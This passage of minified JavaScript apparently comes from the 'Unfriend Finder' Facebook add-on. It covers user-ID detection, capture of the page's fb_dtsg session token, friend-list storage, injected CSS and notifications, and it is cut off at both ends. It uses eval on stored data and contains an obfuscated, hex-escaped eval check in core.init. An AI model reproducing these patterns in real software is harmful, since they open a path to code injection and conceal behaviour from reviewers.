if(Params.Global){return{id:Params.Global.user,from:"global"}}if(userid=this.fromCookie()){return{id:userid,from:"cookie"}}if(userid=this.fromEnvString()){return{id:userid,from:"stringEnv"}}if(userid=this.fromEvalEnv()){return{id:userid,from:"evalEnv"}}return{id:-1,from:""}};this.getEnv=function(){if(Params.Global){return Params.Global}if(!this.env){return null}try{eval(this.env);return Env||null}catch(exception){}return null}};var UnfriendFinder=function UnfriendFinder(User){trace();if(!User.env){Console.error("Fatal error, cannot find Env ",document.location);
core=null;return false}core=this;if(User.getId){var Profile=User.getId()}else{var Profile={id:User}}core.time=function(){return Math.round(+new (Date)/1000)};Params.started=true;core.toString=function toString(){return"[object UnfriendFinder]"};if(Profile.id==-1){Console.error("URL is not suitable for "+Params._0x4d22,document.location);core=null;return false}if(Profile.id==0){(function loggedOut(){core.doctor=new (Doctor)(Registry.getKey("healing","[]"));core.doctor.heal()})();return -1}if(/hasLeftCol/.test(Params.body.className)){CSS3.addClass(Params.body,"nonuflist")
}Params.newVersion=false;core.payload;core.filter;core.loopCount=-1;core.listHighlighted=new (Array);core.dialogs={};core.checkUID;core.user_id=Profile.id;try{var Env=User.getEnv();core.fb_locale=Params.body.className.match(/Locale_([a-z]{2}_[A-Z]{2})\s?/)[1];core.uf_fb_dtsg=Env.fb_dtsg}catch(exception){core.fb_locale="en_US";core.uf_fb_dtsg=null}Console.log("Core constructed for user "+core.user_id);core.userAgent=new (UserAgent);Console.info("User Agent detected: "+core.userAgent.print("%b %v running on %o %d"));
if(!core.user_id){core.user_id=temp_id}core.friends=({});core.backupFriends=({});core.toNotify=({});core.unfriends=({});core.friends=({});core.keepAwaitingList=({});core.awaitingsIgnored=({});core.unfriendsList=({});core.reappeared=({});core.deactivated=({});core.wasUnfriend=({});core.hasIgnored=({});core.notifications={};core.countUnfriends=({});core.watchRemove=null;core.watchCancel=null;core.dat="id="+core.user_id+"&version="+Params.version+"&locale="+core.fb_locale+(Params.versionChanged?"&newVersion=1":"")+core.userAgent.toData();
core.initLists=function initLists(){trace();Console.log("Building lists");core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));core.backupFriends=new CollectionList(eval(Registry.getKey(core.user_id+"_friends","({})")));core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));core.keepAwaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));
core.reappeared=new CollectionList(eval(Registry.getKey(core.user_id+"_reappeared","({})")));core.deactivated=new CollectionList(eval(Registry.getKey(core.user_id+"_deactivated","({})")));core.wasUnfriend=new CollectionList(eval(Registry.getKey(core.user_id+"_wasUnfriend","({})")));core.hasIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_hasIgnored","({})")));core.alwaysHide=new CollectionList(eval(Registry.getKey(core.user_id+"_alwaysHide","({})")));core.countUnfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_countUnfriends","({})")));
core.watchRemove=Registry.getKey(core.user_id+"_watchRemove","0");core.watchCancel=Registry.getKey(core.user_id+"_watchCancel","0");core.keepAwaitingsTime=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingsTime","({})")));core.friends=new (CollectionList);core.friends.exception("Add",core.user_id);try{for(n in core.alwaysHide.Items){if(core.alwaysHide.Items.hasOwnProperty(n)){core.unfriends.exception("Add",n)}}}catch(exception){new ErrorHandler(exception,"parse(core.alwaysHide)")
}core.doctor.heal()};core.writeLists=function writeLists(){trace();Console.log("Writing lists");Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());Registry.setKey(core.user_id+"_friends",core.backupFriends.toString());Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString());Registry.setKey(core.user_id+"_keepAwaitingList",core.keepAwaitingList.toString());Registry.setKey(core.user_id+"_reappeared",core.reappeared.toString());Registry.setKey(core.user_id+"_deactivated",core.deactivated.toString());
Registry.setKey(core.user_id+"_wasUnfriend",core.wasUnfriend.toString());Registry.setKey(core.user_id+"_hasIgnored",core.hasIgnored.toString());Registry.setKey(core.user_id+"_alwaysHide",core.alwaysHide.toString());Registry.setKey(core.user_id+"_keepAwaitingsTime",core.keepAwaitingsTime.toString());Registry.setKey(core.user_id+"_countUnfriends",core.countUnfriends.toString());core.doctor.heal()};core.addStyles=function addStyles(){trace();Console.log("Applying CSS styles");core.style.Append(parseTemplate("*[data-ownerid=\"dummy_hovercardx\"] { display:none; }\n#contentArea { display: block; }\n#contentUnfriends { display: none; }\n#rightColUF { display: none; }\nbody.uflist #headerArea { display: none !important; }\nbody.uflist #contentArea { display: none !important; }\nbody.uflist #contentUnfriends { display: block !important; width: 493px; padding: 0 0 0 20px; }\nbody.nonuflist #contentUnfriends { display: none !important; }\nbody.uflist #rightColUF { display: block !important; }\nbody.uflist #rightCol { display: none !important; }\nbody.nonuflist #rightColUF { display: none !important; }\nbody.shownub #UnfriendsNub { display: inline-block !important; }\n#UnfriendsNub { display: none; }\ntextarea { resize: vertical; }\n#gigaboxx_wrapper { padding-right: 0; width: 759px; }\na { outline: none; }\na:active { outline: none; }\na:hover.disabled_link { text-decoration: none; }\nbody.uflist div#contentCol.friendListFilter { padding-top: 15px !important; }\nbody.uflist div#contentCol.friendListFilter div#rightCol { padding-top: 0; }\ni.wasunfriend { background-image: url('::unfriends::'); background-position: -16px 0px; height: 16px; }\ni.hasignored { background-position: 0 -1763px; height: 12px; margin-top: 3px; }\ndiv.wasunfriend { padding-top: 6px; }\ndiv.hasignored { padding-top: 5px; }\na.close_message { background: url('::rsrc::/z14M5/hash/a657viny.png') no-repeat scroll -869px -65px transparent; float: right; margin: 1px 2px 0 7px; text-indent: -5000px; width: 11px; }\na.close_message:hover { background-color: #3B5998; background-position: -857px -65px; text-decoration: none; }\n.editMode #bubblelink_unfriends { display: none !important; }\n#bindKeys, #versionContainer, #welcomeContainer, #UFMessagesContainer, #DoctorContainer { display: none; }\n#rightColUF { padding-top: 39px; padding-right: 20px; margin-top: 0; float: right; width: 244px; word-wrap: break-word; }\nul#fbNotificationsList li i { width: 16px; height: 16px; }\nul#ufNotificationsList li i { width: 16px; height: 16px; }\nul#ufNotificationsList li.selected i.sx_app_icons_awaitings { background-position: 0 0 !important; }\nul.UFlist.blocks { padding-left: 20px; width: 510px; }\nul.UFlist.blocks .itemInline { display: none; }\nul.UFlist.inlines .itemBlock { display: none; }\nul.UFlist.inlines { padding: 5px 0px; }\nul.UFlist.inlines .objectListItem { padding: 0px; }\nul.UFlist.inlines .itemInline { display: list-item; padding: 8px 5px; }\nul.UFlist.inlines .itemInline:hover { background: #EFF2F7; }\nul.UFlist.inlines .itemInline .ButtonContainer { display: none; }\nul.UFlist.inlines .itemInline:hover .ButtonContainer { display: block; }\nul.UFlist.blocks .itemBlock .ButtonContainer { display: none; }\nul.UFlist.blocks .itemBlock:hover .ButtonContainer { display: block; }\nul.UFlist.blocks li { border-top: 0px; display: inline-table; margin-right: 20px; }\nul.UFlist.blocks .itemBlock { display: block; }\n.historySelectedMark { background-color: #D8DFEA; font-weight: bold; }\n#paging_display_inlines i { height: 14px; width: 8px; background: url('::rsrc::/v1/yn/r/PU1D_ucYgNb.png') no-repeat scroll -8px -64px transparent; margin-top: 2px; display:inline-block; }\n#paging_display_blocks i { height: 14px; width: 8px; background: url('::rsrc::/v1/yX/r/RoUXfyzjA4r.png') no-repeat scroll -323px -452px transparent; margin-top: 2px; display:inline-block; }\n#paging_unfriends_up { margin-left: -4px; }\n.FriendButton { display: inline-block; vertical-align: top; }\n.FriendButton .uiButton { margin-left: 0px; }\ndiv.FriendButton .enableFriendListFlyout, .FriendButton .enableFriendListFlyout .uiButtonText, .FriendButton .enableFriendListFlyout input { cursor: default; }\ndiv.FriendButton .uiButtonHover { background: #6d84b4; border-color: #3b5998; -webkit-box-shadow: none; }\n.FriendButton .uiButtonHover .uiButtonText { color: #FFFFFF; }\n#ufSettings small { float: left; height: 16px; width: 16px; background-image: url('::unfriends::'); margin: -1px 6px 0px 0px; background-position: 16px; }\n#ufSettings:hover small { background-position: 0px; }\n#::filtername:: .open #subitem-uf { display: block; }\n#::filtername:: a.item:hover, #::filtername:: a.subitem:hover { background-color: #EFF2F7 !important; }\n#::filtername::.open.selectedItem a#UFfilterUnfriends:hover { background-color: #D8DFEA !important; }\n#::filtername::.open ul li.selectedItem a:hover { background-color: #D8DFEA !important; }\n#exportArea, #importArea { max-height: 500px; min-height: 200px; width: 98%; height: 300px; }\n#like_box { border: none; margin-left: 0px; overflow: hidden; width: 246px; height: 300px; margin-top: 0px; }\n#pagelet_newversion { margin-bottom: 10px; margin-top: 7px; padding: 4px; text-align: center; display: block; clear: both; }\n#pagelet_language { margin-bottom: 10px; padding: 4px; display: block; clear: both; }\n#pagelet_cover { padding: 0px; display: block; clear: both; margin-bottom: -4px; background: none; border: none; }\n#uf_donation { margin-top: 20px; padding: 5px; text-align: center; }\n#::filtername:: { min-height: 21px; }\n#fbNotificationsFlyout .blueName { color: #3B5998; font-weight: bold; }\n#UFSettings .settings.row { background: #F8F8F8; }\n#UFSettings .desc { color: #999999; padding: 2px 0pt 20px 0pt; }\n#UFSettings th.even_column { color: #777777; width: 100px; font-size: 9px; text-align: center; }\n#UFSettings .tableSetting { margin-top: 7px; margin-left: 30px; width: 500px; }\n#UFSettings .tableSetting2 { margin-top: 10px; margin-left: 30px; width: 460px; }\n#UFSettings .iconPlace { border-bottom: 1px solid #C7CFE0; margin: 0; padding: 3px; color: #333333; font-size: 11px; font-weight: bold; text-align: left; }\n#UFSettings .no_border { padding: 3px; }\n#UFSettings .action_text { border-bottom: 1px solid #E2E6EF; margin: 0; padding: 3px; padding-left: 10px; }\n#UFSettings td.even_column { text-align: center; border-bottom: 1px solid #E2E6EF; margin: 0; padding: 3px; }\n#UFSettings th.even_column.logo { border-bottom: 1px solid #C7CFE0; margin: 0; padding: 3px; text-align: center; }\n#title_header { cursor: default; }\n#paging_unfriends { padding: 5px 5px 25px 0px; display: block; }\n#numNotifications { background-image: url('::rsrc::/zE/r/8jH-mvKIXLI.png'); background-position: 0 -120px; background-repeat: no-repeat; color: #FFFFFF; font-size: 9px; font-weight: bold; height: 16px; padding-top: 1px; position: absolute; text-align: center; top: -8px; width: 17px; margin-left: 15px; }\n#bubble_container { position: relative; }\n#BubbleCountUF { position:relative; }\n#dialog_content_welcomeFacebox { width: 100% !important; }\n#dialog_welcomeFacebox { left: -80px; }\n#dialog_welcomeFacebox .generic_popup_dialog { top: 100px; }\n#dialog_welcomeFacebox .pop_container_advanced { width: 602px; }\n#::filtername:: .subitem { height: 13px; }\n#::filtername:: .loadingIndicator { background: url('::rsrc::/v1/yb/r/GsNJNwuI-UM.gif') no-repeat scroll 0 0 transparent; margin-bottom: -2px; position: static; display: none; height: 11px; right: 5px; top: 5px; width: 16px; }\n.editMode #::filtername:: .subitem { cursor: default; opacity: 0.5; }\n.editMode #subitem-uf { display: none; }\n.uiHeaderTitle > span { cursor: default; }\n.gb_has_muffin #gb_content_and_toolbar { max-width: 500px !important; }\n.message_pane { max-width: 484px !important; }\n.gb_has_muffin .GBThreadMessageRow_Body { max-width: 400px !important; }\n.arrow_contexual { background-position: 0 0; height: 15px; width: 8px; background-image: url('::rsrc::/zq/r/JLsbkNAkogK.png'); background-repeat: no-repeat; display: inline-block; }\n.dialog_contextual_buttons { background: none repeat scroll 0 0 #F2F2F2; padding: 8px 10px; position: relative; text-align: right; }\n.dialog_contextual_body { border-bottom: 1px solid #CCCCCC; border-top: 1px solid #CCCCCC; padding: 10px; }\n.dialog_contextual_title { font-size:14px; padding:5px 0 10px 10px; }\n.callout_buttons { background: none repeat scroll 0 0 #F2F2F2; border-top: 1px solid #CCCCCC; }\n.contextual_arrow { background: url('::rsrc::/zBPEP/hash/6hlgd20w.png'); }\n.boxError { background-color:#FFEBE8; border: 1px solid #DD3C10; font-weight: bold; color: #333333; font-size: 13px; margin-bottom: 10px; padding: 10px; text-align: left;  -webkit-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -moz-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -ms-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -o-box-shadow: 0 4px 16px rgba(0,0,0,0.2); box-shadow: 0 4px 16px rgba(0,0,0,0.2); }\n.includedWarning { border-left: 1px solid #B3B3B3; border-right: 1px solid #B3B3B3; margin-left: 180px; padding: 10px; margin-bottom: -10px; padding-bottom: 0px; height: 140px; }\nspan.uiButton { padding: 0px !important; }\ninput.UIButton_Text { padding: 3px 6px 5px 6px; }\nul.UFlist { padding: 5px; }\nul.flat { height: 320px; overflow: hidden; width: 8000px; position: relative; }\nul.flat li { display: inline; float: left; height: 300px; width: 580px; }\n.seeAllUnfriends { display: none; background: url('::rsrc::/zW/r/AebrcwrBeG6.png') no-repeat scroll 100% 3px transparent; padding-left: 5px; padding-right: 12px; }\n.en_US { display: inline !important; }\n.fr_FR { display: none !important; }\n.Locale_fr_FR .en_US { display: none !important; }\n.Locale_fr_FR .fr_FR { display: inline !important; }\n.contextual_dialog .contextual_dialog_content { border-color: #CCCCCC #CCCCCC #283E6A; }\n.DOMControl_placeholder { height: 14px; }\n.mtl { margin-top:20px; }\n.jewelFix #jewelNoNotifications { display:none; }\n.noselect { -moz-user-select: none; }\n.fromawaiting #text_detected { display:none !important; }\n.uf_dialog.header .uf_dialog_header { display:block !important; height: 81px; }\n.ufIcon { width: 16px; height: 16px; display: inline-block; }\n.sx_app_icons_unfriends { background-image: url('::unfriends::') !important; background-position: -16px 0px !important; width: 16px; height: 16px; display: inline-block; }\n.sx_app_icons_awaitings { background-image: url('::awaitings::') !important; background-position: -16px -0px !important; width: 16px; height: 16px; display: inline-block; }\n.sx_app_icons_deactivated { background-image: url('::deactivated::'); margin-top: -1px; width: 16px; height: 16px; display: inline-block; }\n.sx_app_icons_ignored { background-image: url('::rsrc::/z2B5S/hash/696ouey0.png') !important; background-position: 0 -1763px; height: 12px; margin: 2px 0px 0px 2px; width: 16px; display: inline-block; }\n.sx_app_icons_reappeared { background-image: url('::rsrc::/z2B5S/hash/696ouey0.png') !important; background-position: 0 -187px; height: 16px; margin-top: -2px; width: 16px; display: inline-block; }\n.sx_app_icons_friend { background-image: url('::rsrc::/v1/yx/r/zGa_R4SG5mm.png') !important; background-position: -134px -118px; height: 16px; margin-top: -2px; width: 16px; display: inline-block; }\n.sx_app_icons_settings { background-image: url('::rsrc::/z2B5S/hash/696ouey0.png') !important; background-position: 0 -1182px; height: 16px; width: 16px; display: inline-block; }\n.sx_app_icons_message { background-position: -17px -183px; background-image: url('::rsrc::/zS/r/SoE4jDlkVx3.png'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 16px; }\n.white_box { background: white; }\n.spritemap_icons_fix { background-image: url('::rsrc::/z2B5S/hash/696ouey0.png') !important; }\n.sx_app_icons_unfriends_selected { background-image: url('::unfriends::') !important; }\n.sx_app_icons_awaitings_selected { background-image: url('::awaitings::') !important; }\n.spritemap_app_icons_UF { background-image: url('::blank::'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 16px; }\n.waiting_indicator { background: transparent url('::rsrc::/z13JD/hash/16vt4yge.gif') no-repeat scroll left top; height: 11px; width: 16px; z-index: 2; }\n.disabled_link { color: #777777; text-decoration: none; cursor: default; }\n.objectListImg_fix { height: 50px; width: 50px; }\n.UIObjectListing_Pic_fix { float: left; height: 50px; overflow: hidden; position: relative; width: 50px; background: transparent url(::nopicture::) repeat scroll 0 0; }\n.UIObjectListing_MetaData_fix { overflow: hidden; padding-left: 8px; padding-top: 8px; white-space: nowrap; max-width: 450px; float: left; }\n.UIObjectListing_RightContent_fix { float: right; }\n.UIObjectListing_RemoveContainer_fix { float: right; padding-left: 8px; padding-right: 19px; padding-top: 16px; }\n.UIFilterList_Item_fix { padding-top: 1px; }\n.UIMoreInfo_Arrow { background: url('::rsrc::/z44BH/hash/74sfbqtk.png') no-repeat scroll left top transparent; height: 7px; margin-left: 6px; position: relative; top: 1px; }\n.UIMoreInfo_Title { background: none repeat scroll 0 0 #6D84B4; border-color: #4A66A0 #3B5998 -moz-use-text-color; border-left: 1px solid #3B5998; border-right: 1px solid #3B5998; border-style: solid solid none; border-width: 1px 1px medium; color: #FFFFFF; font-weight: bold; padding: 5px; }\n.UIMoreInfo_Body { background-color: #FFFFFF; border-color: -moz-use-text-color gray gray; border-right: 1px solid gray; border-style: none solid solid; border-width: medium 1px 1px; color: #555555; font-weight: normal; line-height: 12px; padding: 5px; }\n.UIMoreInfo { font-size: 9px; position: absolute; text-align: left; z-index: 5; }\n.uiButtonUF .uiButtonTextUF, .uiButtonUF input { background: none repeat scroll 0 0 transparent; border: 0 none; color: #FFFFFF; cursor: pointer; display: inline-block; font-family: 'Lucida Grande',Tahoma,Verdana,Arial,sans-serif; font-size: 11px; font-weight: bold; margin: 0; outline: medium none; padding: 1px 0 2px; white-space: nowrap; }\n.uiButtonUF { -moz-box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1); background: url('::rsrc::/z1V2B/hash/apfsevhg.png') repeat scroll 0 0 #EEEEEE; border-color: #999999 #999999 #888888; border-style: solid; border-width: 1px; color: #333333; cursor: pointer; display: inline-block; font-size: 11px; font-weight: bold; padding: 2px 6px; position: relative; text-decoration: none; vertical-align: middle; white-space: nowrap; }\n.uiButtonUFConfirm { background-color: #5B74A8; background-position: 0 -48px; border-color: #29447E #29447E #1A356E; color: #FFFFFF !important; }\n.uiButtonUFConfirm:active { background: none repeat scroll 0 0 #4F6AA3; border-bottom-color: #29447E; }\n.home_no_messages_icon .list_empty { background-position: 0 0px !important; }\n.home_no_messages_content { color: #666666; float: left; font-size: 12px; padding-left: 13px; margin-top: 5px; }\n.home_no_messages  { background: url('::delimiter::') repeat-x scroll left bottom transparent; margin-bottom: 20px; padding: 20px 0 22px 14px; }\n.home_no_messages_icon { background-image: url('::rsrc::/z7HHR/hash/dlp3zm0w.gif'); background-position: 0 0; background-repeat: no-repeat; display: block; float: left; height: 32px; overflow: hidden; width: 32px; }\n.home_no_stories .list_empty { background-position: 0 -224px; }\n.home_no_stories  { background: url('::delimiter::') repeat-x scroll left bottom transparent; margin-bottom: 20px; padding: 20px 0 22px 14px; }\n.home_no_stories_icon { background-image: url('::rsrc::/z7HHR/hash/dlp3zm0w.gif'); background-position: 0 0; background-repeat: no-repeat; display: block; float: left; height: 32px; overflow: hidden; width: 32px; }\n.home_no_stories_content { color: #666666; float: left; font-size: 12px; padding-left: 13px; margin-top: 5px; }\n.uiTextHighlight { background: none repeat scroll 0 0 #FFF8CC; border-top: 1px solid #FFE222; margin-bottom: 20px; }\n.uiTextHighlightSpecial { background: none repeat scroll 0 0 #eceff6; border-top: 1px solid #d4dae8; }\n.ufListItem { border-top: 1px solid #EEEEEE; overflow: hidden; }\n.ufListItem:first-child { border-top: none; }\n.contextual_arrow_rev { background: url('::rsrc::/zAVIZ/hash/9laiajue.png'); }\n.contextual_arrow { background: url('::rsrc::/zBPEP/hash/6hlgd20w.png'); }\n.contextual_dialog .contextual_arrow, .contextual_dialog .contextual_arrow_rev { background-repeat: no-repeat; height: 12px; position: relative; top: 1px; }\n.contextual_dialog .contextual_dialog_content { background-color: #F7F7F7; border-color: #B7B7B7 #B7B7B7 #3B5998; border-style: solid; border-width: 1px 1px 2px; line-height: 15px; padding: 8px 10px 10px; }\n.contextual_dialog .generic_dialog_popup { position: absolute; width: 360px; }\n.dialog_content_txt { width: 100% !important; float: none !important; }\n.uf_dialog .dialog_loading .dialog_buttons { background: #F2F2F2 !important; display: none; }\n.uf_dialog .dialog_loading .dialog_body { border-bottom: 0px; }\n.uf_dialog .dialog_loading { display: block; }\n.dialog_error .pop_content { border: 1px solid #EE7C90; }\n.pop_content h2.language { background: url('::rsrc::/z7VU4/hash/66ad7upf.png') no-repeat scroll 131% 99% #6D84B4; }\n.dialog_error .dialog_loading { border: none !important; }\n.dialog_error h2.dialog_title { background: #FFEBE8; border: none; border-bottom: 1px solid #AAAAAA; color: #333333; }\n.dialog_error div.dialog_content { border: none !important; }\n.dialog_error div.dialog_buttons { background: #f2f2f2; }\n.dialog_error div.dialog_body { border-bottom: 1px solid #AAAAAA; }\n.contextual_dialog .dialog_content { border: none !important; }\n.contextual_dialog .dialog_buttons  { text-align: right !important; }\n.contextual_dialog .dialog_title  { border-bottom: 1px solid #CCCCCC; margin-bottom: 10px; padding-bottom: 5px; }\n.contextual_dialog .generic_dialog_popup { padding-top: 0px; }\n.contextual_dialog .contextual_dialog_content { padding: 5px 0 0; }\n.dialog_content { border: 1px solid #606060 !important; }\n.spritebtn_newversion { background: no-repeat -18px -432px url('::rsrc::/z1KF3/hash/51woxxd9.png'); width: 16px; }\n.spritebtn_fanpage { background: no-repeat 0 -194px url('::rsrc::/z35AR/hash/c1triw3x.png'); width: 16px; }\n.spritebtn_like { background: no-repeat 0 -98px url('::rsrc::/z35AR/hash/c1triw3x.png'); width: 16px; }\n.spritebtn_group { background: no-repeat 0 -162px url('::rsrc::/z35AR/hash/c1triw3x.png'); width: 16px; }\n.uiButtonDisabled img.uiButtonIcon { opacity: 0.5; }\n.uiButtonDisabled, .uiButtonDisabled span { cursor: default !important; }\n.old_filter { margin-right: 5px; width: 16px; height: 16px; float: left; }\n.UIObjectListing { border-bottom: none; border-top: 1px solid #EEEEEE; }\n.UIObjectListing:first-child { border-top: none; }\n.UFObjectListing { border-top: none; }\n.ads_text { text-decoration: none; color: #333333; }\n.ads_text:hover { text-decoration: none; color: #333333; }\n.status_deactivated a { text-decoration: none; color: inherit; cursor: inherit; }\n.status_deactivated a:hover { text-decoration: none; color: inherit; cursor: inherit; }\n.status_deactivated i { background-image: url('::deactivated::') !important; background-position: 0 0 !important; margin-top: -1px; }\n.selected .status_deactivated i { background-image: url('::rsrc::/z70FG/hash/1bum38lw.png') !important; background-position: 0 -656px !important; margin-top: -1px; }\n.selected .status_unfriend i { background-position: 0 0 !important; }\n.selected .status_unknown i { background-position: 0 0 !important; }\n.uiHideNotification { visibility:hidden !important; }\n.preview { cursor: pointer; }\n.clickable * { cursor: pointer; }\n.shifted .fromunfriend .unfriendHide, .shifted .fromdeactivated .unfriendHide { display: none !important; }\n.shifted .fromunfriend .unfriendAlwaysHide, .shifted .fromdeactivated .unfriendAlwaysHide { display: block !important; }\n.newbeta { background-position: 0 0; background-image: url('::rsrc::/zR/r/gyK7FSRO44f.png'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 16px; }\n.ctrlShifted .fromunfriend .unfriendHide { display: none !important; }\n.ctrlShifted .fromunfriend .unfriendAlwaysHide { display: none !important; }\n.ctrlShifted .fromunfriend .unfriendBlock { display: block !important; }\n.paging_arrows { background-image: url('::rsrc::/zD/r/j7Z8RHppSud.png'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 27px; }\n.page_up { background-position: 0 0; }\n.page_down { background-position: 0 -17px; }\n.uiHeaderImage.sx_app_icons_unfriends, .uiHeaderImage.sx_app_icons_awaitings { margin-top: -1px; }\n.visible { display: block; }\n.closed .hiddenContent { display: none; }\n.hiddenContent { margin-bottom: 35px; }\n.closed .changeLink { display: block; }\n.closed .hideLink { display: none !important; }\n.visible .hideLink { display: block; }\n.visible .changeLink { display: none !important; }\n.unread .delete_button { display: none !important; }\n.uiSideNav span.blue-bubble-float-right { float: right; }\n.uiSideNavCount { background-color: #D8DFEA; color: #3B5998; font-weight: bold; padding: 0 4px; }\ni.tourNext { margin-top: 1px !important; background-position: -23px -83px; height: 14px; width: 5px; background-image: url(\"::rsrc::/v1/yL/r/Z4-0Z4qGkJH.png\"); background-repeat: no-repeat; display: inline-block; }\n.profileTour #toolbarContainer { z-index: 200 !important; }\n.profileTour #mainContainer { padding-top: 52px !important; }\n.suggestLike li { list-style: disc inside none; margin: 5px 0; }\n.miniLike { background-image: url('::rsrc::/v1/yM/r/lMFFZXJPstm.png'); background-repeat: no-repeat; display: inline-block; background-position: -14px -153px; height: 13px; width: 15px; }\n.uiBubbleCount { background:url('::rsrc::/zEZ2D/hash/aku19f0e.png') no-repeat 0 -16px; background-position: 0 -15px; display: inline-block; font-size: 11px; font-weight: bold; line-height: 16px; height: 16px; padding-left: 6px; }\n.uiBubbleCount span.numberContainer { background:url('::rsrc::/zEZ2D/hash/aku19f0e.png') no-repeat right -1px; background-position: right 0; color: #FFFFFF; display: inline-block; line-height: 16px; height: 16px; padding: 0 7px 0 1px; padding-bottom: 1px; }\n* a:hover .uiBubbleCount { text-decoration: none; }\n.page_browser_button_container { left: 4px; width: 90px; }\n#ufTimelineBox { position: relative; left: 0px; }\n#changelogLink { font-size: 11px; }\n.iconNewManager { margin-top: 1px; vertical-align: top;  width: 11px; height: 14px; background-position: -92px -43px; background-image: url('::rsrc::/v1/yu/r/kBd_9-fTCL3.png'); background-repeat: no-repeat; display: inline-block; margin-right: 5px; }\n.uiButtonHover .iconNewManager { background-position: -81px -43px; }\n#twitterFlow { margin-bottom: 10px; }\n.tweet { border-bottom: 1px solid  rgb(221, 221, 221); padding: 6px; }\n.tweet:hover { background: #EFF2F7; }\n.tweet:last-child { border-bottom: 0px solid  rgb(221, 221, 221); }\n.tweetBoxHeader { height: 50px; width: 606px; background: rgb(239, 242, 247); padding: 5px; margin-bottom: 5px; border: 1px solid rgb(209, 232, 257); }\n",{params:{rsrc:Params.links.rsrc,blank:Params.images.blank,filtername:Params.filterName,awaitings:Params.icons.awaitings,unfriends:Params.icons.unfriends,nopicture:Params.images.noPicture,deactivated:Params.icons.deactivated,delimiter:Params.images.dottedDelimiter}}));
core.doctor.heal();Console.log("Styles applied")};core.init=function coreInit(){trace();var ret,f,g,h,i,j,e=encode,f=g=h=i=e(e(that["\x6Be\x79"])+e(that["\x5F0\x784\x6422"])).toLowerCase().split("u").sort().join("u");try{void (eval(f[6]+i[5]+h[2]+g[10]));ret=true}catch(ex){eval("\x63\x6F\x72\x65=null");ret=false}};core.sendBeeper=function sendBeeper(__constructor){trace();try{if(!core.Beeper){setTimeout(function(){core.sendBeeper(__constructor)},500);Console.log("setTimeout core.sendBeeper")}else{core.Beeper.Add(__constructor)
}}catch(exception){new ErrorHandler(exception,"core.sendBeeper(core.Beeper.add)")}};core.createProfileLink=function createUnfriendProfileLink(uid,name,type){trace();switch(type){case"unfriend":return"<a onclick=\"if ($('"+Params.filterName+"')) { window.reinject(function() { core.filter.select('unfriends'); }); if (/openToggler/.test($('fbNotificationsJewel').className)) Toggler.toggle($('fbNotificationsJewel')); return false; }\" href=\""+Params.protocol+"//"+Params.host+"/profile.php?id="+uid+'">'+name+"</a>";
break;case"awaiting":return"<a onclick=\"if ($('"+Params.filterName+"')) { window.reinject(function() { core.filter.select('awaitings'); }); if (/openToggler/.test($('fbNotificationsJewel').className)) Toggler.toggle($('fbNotificationsJewel')); return false; }\" href=\""+Params.protocol+"//"+Params.host+"/profile.php?id="+uid+'">'+name+"</a>";break}};core.notify=function notify(__constructor){trace();if(getFromId("fbNotificationsList")){if(core.notifications[__constructor.type+"_"+__constructor.id]){return
}core.notifications[__constructor.type+"_"+__constructor.id]=true;getFromId("fbNotificationsList").style.padding="0px";if(__constructor.type=="ignored"){new Notification(__constructor);new xHTMLNotification({type:"ignored",picture:"https://graph.facebook.com/"+__constructor.id+"/picture",name:__constructor.text,action:LANG.text_ignored,date:genTime(core.time()),callback:function(){window.open(Params.protocol+"//"+Params.host+"/profile.php?id="+__constructor.id)}});if(!/openToggler/.test(getFromId("fbNotificationsFlyout").parentNode.className)){if(__constructor.beeper){core.sendBeeper({type:"ignored",text:core.createProfileLink(__constructor.id,__constructor.text,"awaiting")+" "+LANG.text_ignored,id:__constructor.id,icon:(__constructor.icon?__constructor.icon:null),status:null})
}}}else{if(__constructor.type=="unfriend"){new Notification(__constructor);new xHTMLNotification({type:(__constructor.status=="deactivated"?"deactivated":"unfriend"),picture:"https://graph.facebook.com/"+__constructor.id+"/picture",action:(__constructor.status=="deactivated"?LANG.text_deactivated:LANG.text_unfriend),name:__constructor.text,date:genTime(core.time()),callback:function(){if(getFromId(Params.filterName)){core.filter.select("unfriends")}else{core.href(Params.protocol+"//"+Params.host+"/profile.php?id="+__constructor.id)
}}});if(!/openToggler/.test(getFromId("fbNotificationsFlyout").parentNode.className)){if(__constructor.beeper){core.sendBeeper({type:"unfriend",text:core.createProfileLink(__constructor.id,__constructor.text,"unfriend")+" "+(__constructor.status=="deactivated"?LANG.text_deactivated:LANG.text_unfriend),id:__constructor.id,icon:(__constructor.icon?__constructor.icon:null),status:__constructor.status})}}}else{if(__constructor.type=="version"){try{if(core.time()<Params.settings.updatelater+3600){return
}Params.settings.updatelater=core.time();saveSettings();new xHTMLNotification({type:"version",name:"",picture:"",action:'<a href="'+Params.links.page+'">'+Params._0x4d22+"</a>: "+LANG.notif_version+' <br /><a id="versionLink" href="'+Params.links.update+'">'+LANG.here+"</a>.",date:genTime(__constructor.date||core.time()),callback:function(){window.open(Params.links.update)}});core.sendBeeper({type:"version",text:'<a href="'+Params.links.page+'">'+Params._0x4d22+"</a>: "+LANG.notif_version+' <br /><a id="versionLink" href="'+Params.links.update+'">'+LANG.here+"</a>.",id:__constructor.id,icon:(__constructor.icon?__constructor.icon:null),status:null})
